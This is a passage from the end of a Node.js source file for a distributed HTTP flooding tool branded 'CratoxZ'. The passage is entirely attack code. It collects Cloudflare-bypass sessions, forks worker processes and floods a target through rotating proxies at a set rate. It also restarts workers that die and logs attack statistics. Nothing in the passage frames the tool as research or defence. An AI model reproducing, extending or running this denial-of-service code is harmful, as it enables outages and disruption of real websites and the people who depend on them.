            console.log(`${COLORS.red} CratoxZ: Session failed in batch${COLORS.reset}`);
          }
        });
        
        // Continue with the next batch after a delay
        if (results.length < 10) { // Continue until we have enough sessions
          console.log(`${COLORS.yellow} CratoxZ: Waiting 3s before next batch...${COLORS.reset}`);
          setTimeout(runBatch, 3000);
        } else {
          console.log(`\n${COLORS.green} CratoxZ: Obtained ${results.length} sessions, starting attack!${COLORS.reset}`);
          resolve(results);
        }
      }).catch((batchError) => {
        console.log(`${COLORS.red} CratoxZ: Error in batch processing: ${batchError.message}${COLORS.reset}`);
        setTimeout(runBatch, 3000);
      });
    }
    
    runBatch();
  });
}

// Run flooder function
function runFlooder() {
  if (!global.bypassData || global.bypassData.length === 0) return;
  
  const bypassIndex = Math.floor(Math.random() * global.bypassData.length);
  const bypassInfo = global.bypassData[bypassIndex];
  
  if (!bypassInfo || !bypassInfo.success) return;
  
  const cookieString = bypassInfo.cookies && bypassInfo.cookies.length > 0 
    ? bypassInfo.cookies.map((c) => `${c.name}=${c.value}`).join("; ") 
    : "";
  
  const userAgent = bypassInfo.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
  
  // Get a proxy for this request
  const proxy = getNextProxy(proxies);
  if (!proxy || global.failedProxies.has(proxy)) return;
  
  console.log(`${COLORS.cyan} CratoxZ: Running flooder with proxy ${proxy}...${COLORS.reset}`);
  flood(userAgent, cookieString, proxy);
}

// Initialize global stats
global.startTime = Date.now();
global.bypassData = [];
global.failedProxies = new Set();
global.proxyIndex = 0;
global.totalRequests = 0;

// Main execution
if (cluster.isMaster) {
  printHeader();
  
  // Display attack parameters
  console.log(`${COLORS.cyan}${COLORS.bold}Attack Parameters:${COLORS.reset}`);
  console.log(`${COLORS.white}Target: ${args.target}${COLORS.reset}`);
  console.log(`${COLORS.white}Rate: ${args.Rate} requests/interval${COLORS.reset}`);
  console.log(`${COLORS.white}Threads: ${args.threads}${COLORS.reset}`);
  console.log(`${COLORS.white}Proxies: ${proxies.length}${COLORS.reset}`);
  console.log(`${COLORS.magenta}${COLORS.bold}--------------------------------------------${COLORS.reset}\n`);
  
  bypassCloudflareParallel().then((bypassResults) => { 
    global.bypassData = bypassResults;
    console.log(`\n${COLORS.green} CratoxZ: Successfully obtained ${bypassResults.length} sessions!${COLORS.reset}`);
    console.log(`${COLORS.magenta} CratoxZ: Starting attack on ${args.target}...${COLORS.reset}\n`);
    
    global.startTime = Date.now();
    
    // Start stats display
    const statsInterval = setInterval(() => {
      const elapsed = (Date.now() - global.startTime) / 1000;
      const rps = elapsed > 0 ? Math.round(global.totalRequests / elapsed) : 0;
      console.log(`${COLORS.cyan}[STATS] Requests: ${global.totalRequests} | RPS: ${rps}/s | Workers: ${Object.keys(cluster.workers || {}).length}${COLORS.reset}`);
    }, 5000);
    
    // Create worker processes
    for (let i = 0; i < args.threads; i++) {
      const worker = cluster.fork();
      worker.send({ 
        type: 'bypassData', 
        data: bypassResults,
        proxies: proxies
      });
    }
    
    // Handle worker messages for request counting
    cluster.on('message', (worker, message) => {
      if (message === 'request') {
        global.totalRequests++;
      }
    });
    
    cluster.on('exit', (worker) => {
      console.log(`${COLORS.yellow} CratoxZ: Worker died, restarting...${COLORS.reset}`);
      const newWorker = cluster.fork();
      newWorker.send({ 
        type: 'bypassData', 
        data: global.bypassData,
        proxies: proxies
      });
    });
    
    // Auto-stop after 1 hour (optional)
    setTimeout(() => {
      clearInterval(statsInterval);
      console.log(`\n${COLORS.green} CratoxZ: Attack completed!${COLORS.reset}`);
      console.log(`${COLORS.cyan}Total Requests: ${global.totalRequests}${COLORS.reset}`);
      process.exit(0);
    }, 3600000);
    
  }).catch((error) => {
    console.log(`${COLORS.red} CratoxZ: Fatal error in main execution: ${error.message}${COLORS.reset}`);
    process.exit(1);
  });
} else {
  // Worker process
  let workerBypassData = [];
  let workerProxies = [];
  let attackInterval;
  global.proxyIndex = 0;
  
  process.on('message', (msg) => {
    if (msg.type === 'bypassData') {
      workerBypassData = msg.data;
      workerProxies = msg.proxies;
      global.bypassData = msg.data;
      
      console.log(`${COLORS.cyan} CratoxZ: Worker received ${global.bypassData.length} sessions, starting attack...${COLORS.reset}`);
      
      // Start attacking
      attackInterval = setInterval(() => {
        // Send multiple requests per interval
        for (let i = 0; i < Math.max(1, Math.floor(args.Rate / 2)); i++) {
          runFlooder();
        }
      }, 100);
    }
  });
  
  // Cleanup on exit
  process.on('disconnect', () => {
    if (attackInterval) clearInterval(attackInterval);
    process.exit(0);
  });
}

process.on('uncaughtException', (err) => {
  console.log(`${COLORS.red} CratoxZ: Uncaught Exception: ${err.message}${COLORS.reset}`);
});

process.on('unhandledRejection', (reason, promise) => {
  console.log(`${COLORS.red} CratoxZ: Unhandled Rejection: ${(reason.message || reason)}${COLORS.reset}`);
});
[file content end]